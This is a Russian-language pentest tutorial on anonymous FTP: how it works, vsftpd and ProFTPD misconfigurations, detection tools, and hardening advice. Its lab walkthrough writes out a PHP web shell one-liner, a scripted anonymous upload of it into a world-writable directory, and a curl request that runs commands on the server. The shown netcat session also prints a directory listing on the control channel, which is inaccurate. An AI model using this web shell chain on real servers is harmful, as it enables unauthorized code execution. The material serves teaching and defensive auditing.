# Anonymous FTP-Login: Архитектура, Уязвимости и Практика Тестирования

## Контекст и базовые понятия

Протокол File Transfer Protocol (FTP), описанный в RFC 959 (1985), является одним из старейших стандартов передачи файлов в сетях TCP/IP. Его ключевой особенностью, определяющей архитектуру безопасности, является разделение каналов управления и данных. Канал управления (Control Channel) использует порт 21 по умолчанию и отвечает за аутентификацию, управление сессией и передачу команд. Канал данных (Data Channel) открывается динамически (в пассивном режиме) или на порту 20 (в активном режиме) для непосредственной передачи файлов и списков каталогов.

В контексте информационной безопасности термин **Anonymous FTP** (Анонимный FTP) относится к механизму аутентификации, позволяющему неавторизованным пользователям получать доступ к ресурсам файлового сервера. Механизм основан на использовании предопределенных учетных данных: имя пользователя всегда `anonymous` (или `ftp`), а в качестве пароля указывается email-адрес пользователя или произвольная строка. Этот подход исторически применялся для распространения общедоступного программного обеспечения, документации и данных.

Важно разграничивать понятия **Anonymous FTP** и **Guest Account** (Гостевая учетная запись). Guest Account — это реальная учетная запись в операционной системе (например, `guest` в Windows или `ftpuser` в Linux), которая имеет ограниченные права доступа. Anonymous FTP — это логическая абстракция на уровне сервиса FTP-демона, которая маппится на системного пользователя (обычно `ftp` или `nobody`) с ограниченным доступом к файловой системе (chroot).

| Характеристика | Anonymous FTP | Guest Account (Гостевая запись) |
|---|---|---|
| **Механизм аутентификации** | Логика внутри FTP-демона (проверка имени `anonymous`) | Стандартная система аутентификации ОС (PAM, SAM, AD) |
| **Имя пользователя** | Жестко задано (`anonymous` / `ftp`) | Задано администратором (например, `guest`, `visitor`) |
| **Пароль** | Произвольная строка (часто email) | Строгий пароль, заданный администратором |
| **Уровень изоляции** | Зависит от конфигурации chroot FTP-сервера | Зависит от прав доступа ОС и групповых политик |
| **Цель применения** | Публикация публичных данных (download-only) | Предоставление ограниченного доступа конкретным лицам |
| **Уязвимость** | Переполнение буфера демона, неправильные права chroot | Слабый пароль, ошибки конфигурации прав ОС |

Путаница между этими понятиями возникает из-за того, что многие современные FTP-серверы (vsftpd, ProFTPD, FileZilla Server) реализуют анонимный доступ через создание специальной системной учетной записи. Однако с точки зрения атаки на проникновение (pentest) критически важно понимать, что атака направлена не на подбор пароля гостевой записи, а на эксплуатацию логики анонимного входа и последующую неправильную конфигурацию прав доступа к файловой системе.

Анонимный доступ считается устаревшей практикой в современных корпоративных средах. Согласно рекомендациям CIS Benchmarks и NIST SP 800-123, анонимный FTP должен быть отключен. Тем не менее, он остается частым объектом тестирования на проникновение по следующим причинам:
1.  **Историческое наследие:** Многие унаследованные системы (legacy) до сих пор используют FTP для обмена данными.
2.  **Ошибки конфигурации:** Администраторы могут случайно разрешить запись в анонимные каталоги, что приводит к загрузке вредоносного кода.
3.  **Информационная утечка:** Анонимные каталоги часто содержат бэкапы, исходный код, конфигурационные файлы или внутренние документы, не предназначенные для публичного доступа.

В отличие от современных протоколов (SFTP, FTPS, HTTPS), FTP передает учетные данные и данные в открытом виде (plaintext). Это делает перехват пароля анонимного входа тривиальной задачей для атакующего, находящегося в том же сегменте сети, хотя сам пароль `anonymous` не представляет ценности для последующего входа на другие системы.

## Внутреннее устройство механизма Anonymous FTP

Механизм Anonymous FTP реализуется на уровне приложения (уровень 7 модели OSI) и зависит от конкретной реализации FTP-сервера. Рассмотрим архитектуру на примере наиболее распространенных реализаций: **vsftpd** (Very Secure FTP Daemon), **ProFTPD** и **FileZilla Server**.

### 1. Логика аутентификации

Процесс анонимного входа состоит из трех этапов:
1.  **Установка соединения:** Клиент подключается к порту 21. Сервер отправляет приветственное сообщение (например, `220 (vsFTPd 3.0.3)`).
2.  **Отправка команды USER:** Клиент отправляет `USER anonymous`.
3.  **Отправка команды PASS:** Клиент отправляет `PASS <email_or_string>`.

FTP-демон проверяет имя пользователя. Если оно равно `anonymous` (или `ftp`, в зависимости от конфигурации `anonymous_enable`), сервер не проверяет хеш пароля в системном файле `/etc/shadow` или базе данных пользователей. Вместо этого он выполняет маппинг на системного пользователя `ftp` (или `nobody`).

В **vsftpd** логика описана в файле конфигурации `/etc/vsftpd.conf`:
```ini
anonymous_enable=YES
no_anon_password=YES  # Если YES, пароль не запрашивается
local_enable=NO       # Отключает вход локальных пользователей
```
Если `no_anon_password` установлен в `YES`, сервер принимает любой пароль или вообще не запрашивает его, что упрощает автоматизацию сканирования.

В **ProFTPD** конфигурация может выглядеть так:
```apache
<Anonymous ~ftp>
    User ftp
    Group ftp
    UserAlias anonymous ftp
    DirFakeUser on ftp
    DirFakeGroup on ftp
    RequireValidShell no
    MaxClients 10
    DisplayLogin welcome.msg
    DisplayChdir .message
    <Directory *>
        <Limit WRITE>
            DenyAll
        </Limit>
    </Directory>
</Anonymous>
```
Здесь ключевым элементом является директива `<Anonymous>`, которая создает виртуальную файловую систему (chroot) для анонимных пользователей.

### 2. Структура файловой системы и права доступа

Безопасность анонимного FTP зависит не от криптографии, а от прав доступа операционной системы. Типичная структура каталогов:

```text
/var/ftp/          # Корень chroot для анонимного пользователя (vsftpd)
├── pub/           # Публичный каталог для загрузки файлов
│   ├── linux/
│   └── windows/
└── incoming/      # Каталог для загрузки файлов от пользователей
```

Критическая уязвимость возникает, если права на каталог `incoming` или `pub` позволяют другим пользователям ОС (группа `ftp` или `others`) писать в эти директории.

| Параметр конфигурации | Безопасное значение | Уязвимое значение | Последствия уязвимости |
|---|---|---|---|
| `anon_upload_enable` | `NO` | `YES` | Атакующий может загружать файлы (web shells, malware) |
| `anon_mkdir_write_enable` | `NO` | `YES` | Создание новых каталогов для обхода ограничений |
| `anon_other_write_enable` | `NO` | `YES` | Переименование и удаление чужих файлов |
| Права на `/var/ftp/pub` | `755` (drwxr-xr-x) | `777` (drwxrwxrwx) | Любой пользователь ОС может записывать данные |
| Права на `/var/ftp/incoming` | `1733` (drwxrwxrwt) | `777` | Возможность записи в чужие файлы (если права не ограничены sticky bit) |

### 3. Режимы передачи данных и уязвимости

FTP использует два режима соединения:
1.  **Active Mode (PORT):** Клиент открывает порт N, отправляет команду `PORT ip1,ip2,ip3,ip4,p1,p2` серверу. Сервер подключается к клиенту на порт `N = p1*256 + p2`.
    *   *Уязвимость:* Может использоваться для обхода файрволов, если клиент находится за NAT, но также позволяет атакующему инициировать соединения с внутренними хостами (SSRF-подобные атаки через PORT).
2.  **Passive Mode (PASV):** Сервер открывает порт P и сообщает клиенту. Клиент подключается к серверу.
    *   *Уязвимость:* Если диапазон пассивных портов не ограничен, атакующий может сканировать открытые порты сервера.

В контексте анонимного FTP наиболее опасной является возможность загрузки файлов. Если сервер разрешает запись (`WRITE`), атакующий может загрузить исполняемый файл (например, `shell.php` или `backdoor.exe`) в каталог, который обслуживается веб-сервером (common misconfiguration: `/var/www/html` и `/var/ftp/pub` имеют общего владельца или перекрываются правами).

### 4. Индикаторы наличия Anonymous FTP

Для обнаружения анонимного FTP используются следующие признаки:
*   **Ответ сервера:** Строка `230 Login successful.` после отправки `USER anonymous` и `PASS anonymous`.
*   **Команда SYST:** Ответ `215 UNIX Type: L8` указывает на Unix-подобную ОС.
*   **Команда FEAT:** Поддержка расширений (например, `UTF8`, `SIZE`, `MLST`).
*   **Отсутствие запроса пароля:** Если сервер не запрашивает пароль при `no_anon_password=YES`, это явный индикатор.

## Применение и работа с предметом

На практике тестирование на проникновение с использованием Anonymous FTP включает этапы обнаружения, аутентификации, анализа структуры каталогов и оценки рисков.

### 1. Инструментарий и методы обнаружения

Для автоматизированного сканирования используются инструменты:
*   **Nmap:** Скрипт `ftp-anon.nse` проверяет возможность анонимного входа.
*   **Metasploit:** Модуль `auxiliary/scanner/ftp/ftp_login` с параметрами `USER_ANON=YES`.
*   **Netcat:** Ручное взаимодействие для анализа ответов сервера.

### 2. Ручное тестирование и анализ

После успешного входа атакующий должен исследовать файловую систему. Важно не только скачать файлы, но и проверить права на запись.

**Типичные операции:**
1.  Проверка текущего каталога: `pwd`
2.  Список файлов с правами: `ls -la`
3.  Проверка возможности записи: `site chmod 666 test.txt` (если команда поддерживается) или попытка загрузки тестового файла.
4.  Поиск чувствительных данных: `find` (если поддерживается сервером) или ручное сканирование каталогов.

### 3. Типичные ошибки конфигурации

1.  **Разрешение записи в корневой каталог:** Если `anon_mkdir_write_enable=YES` и права на `/var/ftp` позволяют создание каталогов, атакующий может создать структуру, имитирующую легитимные пути.
2.  **Пересечение путей с веб-сервером:** Если FTP-сервер и веб-сервер используют один и тот же каталог для хранения файлов (например, `/var/www/html`), загрузка файла через FTP позволяет выполнить произвольный код (RCE) через веб-интерфейс.
3.  **Использование слабых паролей для гостевых записей:** Хотя это не чистый Anonymous FTP, часто администраторы создают учетную запись `ftp` с паролем `ftp` или `123456`, что позволяет войти как локальный пользователь, если `local_enable=YES`.

### 4. Паттерны атак на основе Anonymous FTP

*   **Web Shell Upload:** Загрузка PHP-скрипта в публичный каталог, доступный через HTTP.
*   **Data Exfiltration:** Скачивание бэкапов баз данных, конфигурационных файлов (`/etc/passwd`, если права позволяют чтение, хотя chroot обычно блокирует это).
*   **Malware Distribution:** Размещение вредоносного ПО для распространения среди пользователей, скачивающих файлы с сервера.

## Сквозной практический пример: Исследование уязвимого FTP-сервера

**Исходные условия:**
*   **Цель:** Виртуальная машина `ftp-server.local` с установленным vsftpd 3.0.3.
*   **Инструменты:** Nmap, Netcat, FileZilla Client.
*   **Роль:** Тестировщик на проникновение.
*   **Сценарий:** Обнаружение и эксплуатация уязвимой конфигурации анонимного FTP для загрузки веб-шелла.

### Шаг 1: Сканирование и обнаружение службы

Используем Nmap для определения версии службы и проверки поддержки анонимного входа.

```bash
nmap -sV -p 21 --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 <IP_TARGET>
```

**Ожидаемый вывод:**
```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp           0 Jan 01  2023 readme.txt
| -rw-r--r--    1 ftp      ftp        1024 Jan 01  2023 backup.sql
| No session cache generated
|_ftp-syst: 220 (vsFTPd 3.0.3)
```
*Анализ:* Сервер разрешает анонимный вход. В каталоге присутствует файл `backup.sql`, что указывает на потенциальную утечку данных. Версия vsftpd 3.0.3 содержит известную уязвимость (CVE-2021-3618), но в данном примере фокусируемся на конфигурации.

### Шаг 2: Подключение и анализ структуры каталогов

Подключаемся через Netcat для ручного анализа команд и прав.

```bash
nc <IP_TARGET> 21
```

Ввод команд:
```text
USER anonymous
PASS anonymous@
230 Login successful.
SYST
215 UNIX Type: L8
PWD
257 "/" is the current directory
LIST
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp         4096 Jan 01  2023 pub
drwxrwxrwx    2 ftp      ftp         4096 Jan 01  2023 incoming
226 Directory send OK.
```

*Анализ:* Ключевой индикатор — права на каталог `incoming`: `drwxrwxrwx` (777). Это означает, что любой пользователь, включая анонимного, может создавать файлы и каталоги в этой директории. Каталог `pub` имеет права `drwxr-xr-x` (755), что позволяет только чтение.

### Шаг 3: Проверка возможности загрузки и пересечения путей

Проверяем, доступен ли каталог `incoming` через веб-сервер. Предположим, что веб-сервер на том же хосте обслуживает `/var/www/html`. Если FTP-сервер настроен на запись в `/var/www/html/incoming`, это критическая уязвимость.

В конфигурации vsftpd проверяем (если есть доступ к серверу или в документации):
```ini
anon_upload_enable=YES
anon_mkdir_write_enable=YES
anon_other_write_enable=YES
```

Загружаем тестовый файл через FileZilla или командную строку.

```bash
# Команда для загрузки файла
echo "<?php system($_GET['cmd']); ?>" > shell.php
ftp -n <IP_TARGET> <<EOF
user anonymous anonymous
binary
cd incoming
put shell.php
bye
EOF
```

**Ожидаемый результат:**
Файл `shell.php` успешно загружается в каталог `incoming`.

### Шаг 4: Эксплуатация и получение доступа

Если веб-сервер обслуживает каталог `incoming` (или если FTP и веб используют общий chroot), атакующий может выполнить код.

```bash
curl http://<IP_TARGET>/incoming/shell.php?cmd=id
```

**Ожидаемый вывод:**
```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
*Анализ:* Успешное выполнение команды на сервере. Это демонстрирует цепочку уязвимостей: разрешенный анонимный вход + права записи 777 + пересечение путей с веб-сервером.

### Ожидаемый вывод примера

Пример демонстрирует, что Anonymous FTP сам по себе не является уязвимостью, но его неправильная конфигурация (разрешение записи в общедоступные каталоги) может привести к критическим последствиям, таким как удаленное выполнение кода (RCE). Тестировщик должен всегда проверять права доступа к загружаемым файлам и их доступность через другие сервисы.

## Аналитический вывод

Anonymous FTP представляет собой исторически значимый, но потенциально опасный механизм доступа, который требует тщательного аудита в современных инфраструктурах. Основная угроза заключается не в самом протоколе, а в ошибках конфигурации, связанных с правами доступа к файловой системе и разрешением записи для анонимных пользователей. Тестирование на проникновение в этом контексте должно включать не только проверку факта анонимного входа, но и глубокий анализ структуры каталогов, прав доступа и возможных пересечений с другими сервисами (например, веб-серверами).

Рекомендации по защите включают:
1.  Отключение анонимного входа (`anonymous_enable=NO`).
2.  Использование FTPS или SFTP для шифрования трафика.
3.  Строгое ограничение прав доступа к каталогам (минимальные привилегии).
4.  Регулярный аудит конфигураций FTP-серверов на соответствие стандартам CIS.

Игнорирование этих мер может привести к утечке данных, загрузке вредоносного ПО и компрометации всей сети.
